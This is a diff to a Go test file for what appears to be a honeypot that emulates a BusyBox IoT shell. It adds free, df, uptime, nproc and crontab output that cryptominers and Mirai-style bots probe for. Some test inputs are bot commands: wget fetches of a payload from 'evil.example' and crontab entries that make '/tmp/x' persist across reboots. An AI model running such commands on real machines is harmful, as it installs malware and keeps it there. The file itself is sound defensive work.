@@ -27,7 +27,7 @@ func TestRun(t *testing.T) {
 		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
 		{"busybox echo hello", "hello\n"},
 		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
-		{"ls /var", "log  run  tmp  www\n"},
+		{"ls /var", "log    run    spool  tmp    www\n"},
 		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
 		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
 		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
@@ -53,7 +53,7 @@ func TestRun(t *testing.T) {
 		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
 		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
 		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
-		{"cd /bin; ./ls /var", "log  run  tmp  www\n"},
+		{"cd /bin; ./ls /var", "log    run    spool  tmp    www\n"},
 		{"/sbin/init", "init: must be run as PID 1\n"},
 		{"cat /var/run/dropbear.pid", "341\n"},
 		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
@@ -85,6 +85,11 @@ func TestExitCodes(t *testing.T) {
 		{"lighttpd", 0}, // a program in PATH that isn't an applet: "runs" silently
 		{"/usr/sbin/dropbear", 0},
 		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
+		{"free -h", 1},                          // BusyBox's free has no -h: usage
+		{"nproc && free -m && df -h && uptime", 0},
+		{"df /nope", 1},
+		{"crontab -l", 1}, // no crontab yet
+		{"echo '* * * * * x' | crontab - && crontab -l", 0},
 		{"", 0},
 	}
 	for _, tt := range tests {
@@ -143,8 +148,8 @@ func TestLs(t *testing.T) {
 	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
 	tests := []struct{ line, want string }{
 		{"ls /", "bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
-		{"ls -1 /var", "log\nrun\ntmp\nwww\n"},
-		{"ls --color=auto /var", "log  run  tmp  www\n"},
+		{"ls -1 /var", "log\nrun\nspool\ntmp\nwww\n"},
+		{"ls --color=auto /var", "log    run    spool  tmp    www\n"},
 		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
 		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
 		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
@@ -242,9 +247,10 @@ func TestBusyboxHelp(t *testing.T) {
 		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
 	}
 	want := "Currently defined functions:\n" +
-		"\tash, cat, chmod, cp, echo, false, ftpget, grep, hostname, id, init,\n" +
-		"\tkill, killall, klogd, login, ls, mkdir, mv, ps, pwd, rm, sh, sleep,\n" +
-		"\tsyslogd, telnetd, tftp, touch, true, uname, wget, whoami\n"
+		"\tash, cat, chmod, cp, crontab, df, echo, false, free, ftpget, grep,\n" +
+		"\thostname, id, init, kill, killall, klogd, login, ls, mkdir, mv, nproc,\n" +
+		"\tps, pwd, rm, sh, sleep, syslogd, telnetd, tftp, touch, true, uname,\n" +
+		"\tuptime, wget, whoami\n"
 	if !strings.HasSuffix(out, want) {
 		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
 	}
@@ -271,6 +277,80 @@ func TestWebFile(t *testing.T) {
 	}
 	if page, _ := WebFile("/"); page != LoginPage(false) {
 		t.Error("/ is not the login page")
+	}
+}
+
+// What cryptominers check before installing: the output of BusyBox 1.30.1 (its printf formats) with
+// Buildroot's config, the numbers from /proc/meminfo, /proc/cpuinfo and /proc/mounts.
+func TestMinerCommands(t *testing.T) {
+	fixedClock(t) // now Nov 20 10:30:00, boot Nov 18 09:15:00 = up 2 days 1:15
+	const crontabUsage = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
+		"Usage: crontab [-c DIR] [-u USER] [-ler]|[FILE]\n\n" +
+		"\t-c\tCrontab directory\n\t-u\tUser\n\t-l\tList crontab\n\t-e\tEdit crontab\n" +
+		"\t-r\tDelete crontab\n\tFILE\tReplace crontab by FILE ('-': stdin)\n"
+	tests := []struct{ line, want string }{
+		// free: total = MemTotal, free = MemFree, shared = Shmem, buff/cache = Buffers + Cached,
+		// used = the rest, available = MemAvailable; no swap
+		{"free", "              total        used        free      shared  buff/cache   available\n" +
+			"Mem:         124520       58608       38412         312       27500       61208\n" +
+			"Swap:             0           0           0\n"},
+		{"free -m | grep Mem", "Mem:            121          57          37           0          26          59\n"},
+		{"free -h", "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
+			"Usage: free [-b/k/m/g]\n\nDisplay the amount of free and used system memory\n"},
+		{"nproc", "1\n"}, // one "processor" in /proc/cpuinfo
+		{"nproc --all", "1\n"},
+
+		{"uptime", " 10:30:00 up 2 days,  1:15,  load average: 0.08, 0.03, 0.01\n"},
+		{"uptime -s", "2026-11-18 09:15:00\n"},
+		{"cat /proc/uptime /proc/loadavg", "177300.00 173754.00\n0.08 0.03 0.01 1/9 530\n"},
+
+		// df: the two tmpfs from /proc/mounts (rootfs, proc and sysfs have no blocks); /tmp gets
+		// half the RAM (62260K), /dev its size=512k
+		{"df", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
+			"tmpfs                    62260         0     62260   0% /tmp\n" +
+			"tmpfs                      512         0       512   0% /dev\n"},
+		{"df -h", "Filesystem                Size      Used Available Use% Mounted on\n" +
+			"tmpfs                    60.8M         0     60.8M   0% /tmp\n" +
+			"tmpfs                   512.0K         0    512.0K   0% /dev\n"},
+		{"cd /tmp; echo kami > .x; df -h .", "Filesystem                Size      Used Available Use% Mounted on\n" +
+			"tmpfs                    60.8M      4.0K     60.8M   0% /tmp\n"}, // a file takes a whole 4K page
+		{"echo kami > /tmp/x; df -m | grep /tmp", "tmpfs                       61         0        61   0% /tmp\n"},
+		{"cp /etc/passwd /dev/shm/p; df /dev/shm", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
+			"tmpfs                      512         4       508   1% /dev\n"}, // 1 page of 128: (100 + 64) / 128
+		{"df -T | grep Filesystem", "Filesystem           Type       1K-blocks      Used Available Use% Mounted on\n"},
+		{"df /proc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
+			"proc                         0         0         0   0% /proc\n"},
+		{"df /etc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n"}, // on rootfs: left out
+		{"df /nope", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
+			"df: /nope: can't find mount point\n"},
+
+		// crontab: how miners come back after a reboot
+		{"crontab -l", "crontab: can't open 'root': No such file or directory\n"},
+		{`(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/x") | crontab -; crontab -l`, "*/5 * * * * /tmp/x\n"},
+		{"echo '* * * * * a' | crontab -; crontab -r; crontab -l", "crontab: can't open 'root': No such file or directory\n"},
+		{"echo '@reboot /tmp/x' > /tmp/c; crontab /tmp/c; ls /var/spool/cron/crontabs; cat /var/spool/cron/crontabs/cron.update",
+			"cron.update  root\nroot\n"},
+		{"crontab /tmp/nope", "crontab: can't open '/tmp/nope': No such file or directory\n"},
+		{"crontab -u admin -l", "crontab: can't open 'admin': No such file or directory\n"},
+		{"crontab -u bob -l", "crontab: unknown user bob\n"},
+		{"crontab -e; crontab -l && echo empty", "crontab: can't execute 'vi': No such file or directory\nempty\n"},
+		{"crontab", crontabUsage},
+		{"crontab -l -r", crontabUsage},
+
+		// a subshell's commands are one group: | gets all their output; "$(" is still part of a word
+		{"(echo a; echo b) | grep b", "b\n"},
+		{"(echo a; echo b) | grep a", "a\n"},
+		{"(echo a; echo b)", "a\nb\n"},
+		{"echo x; (echo a) | grep a; echo y | grep y", "x\na\ny\n"},
+		{"echo $(id)", "$(id)\n"},
+		{"echo '* * * * * one' | crontab -; (crontab -l; echo '* * * * * two') | crontab -; crontab -l",
+			"* * * * * one\n* * * * * two\n"}, // a bot that comes twice keeps its first job too
+	}
+	for _, tt := range tests {
+		got, _, _ := NewShell().Run(tt.line)
+		if got != tt.want {
+			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
+		}
 	}
 }
 
